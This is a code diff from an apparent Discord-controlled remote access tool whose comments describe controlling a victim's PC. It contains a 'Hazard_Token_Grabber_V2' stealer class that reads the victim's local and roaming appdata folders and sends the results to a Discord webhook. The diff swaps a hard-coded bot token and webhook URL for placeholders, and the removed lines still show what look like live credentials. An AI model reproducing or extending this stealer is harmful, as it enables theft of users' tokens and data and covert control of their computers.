@@ -53,8 +53,8 @@ slash = SlashCommand(client, sync_commands=True)
 
 ogdir = os.getcwd(); a = 1
 
-token = 'ODk5OTA4ODQ3MzkxNjI5Mzcy.YW5nbA.NbISbTERXvWGnhZvVQbB0kqjVwU' #bot token that will you will control their pc thru
-g = [888075171469078579] #guild id that the slash commands get registered on
+token = 'BOTTOKENHERE' #bot token that will you will control their pc thru
+g = [GUILDIDHERE] #guild id that the slash commands get registered on
 
 
 @client.event
@@ -401,7 +401,7 @@ async def Stealer_command(ctx: SlashContext):
         await ctx.send("Sending all things via webhook to #stealer-info coz i am fricking noob...")
         class Hazard_Token_Grabber_V2:
             def __init__(self):
-                self.webhook = "https://discord.com/api/webhooks/929010014251786241/as-TUxgaGxLcufOHQ_qHpI-t5qKEWn9u6c8R6vffA85x3i4imZbM2ivSbvN4-eKmMbwN"
+                self.webhook = "WEBHOOKLINKHERE"
                 self.files = ""
                 self.appdata = os.getenv("localappdata")
                 self.roaming = os.getenv("appdata")
